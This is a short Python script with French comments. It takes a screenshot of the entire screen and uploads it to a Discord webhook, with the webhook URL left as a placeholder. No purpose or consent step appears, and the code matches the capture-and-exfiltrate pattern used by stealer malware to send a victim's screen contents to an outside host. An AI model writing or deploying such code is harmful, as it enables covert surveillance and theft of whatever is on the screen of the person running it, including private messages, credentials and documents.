import requests
import pyautogui

# URL du webhook Discord
webhook_url = "ton webhook discord"



# Prenez une capture d'écran de l'écran entier
capture_ecran = pyautogui.screenshot()

# Enregistrez la capture d'écran localement (temporairement)
capture_ecran.save("capture_ecran.png")

# Créez un objet de fichiers pour la capture d'écran
capture_file = open("capture_ecran.png", "rb")

# Construisez la payload pour la requête POST
payload = {
    "content": "Capture d'écran envoyée avec succès.",
    "file": capture_file
}

# Envoyez la requête POST au webhook Discord
response = requests.post(webhook_url, files=payload)


# Fermez le fichier de capture d'écran
capture_file.close()
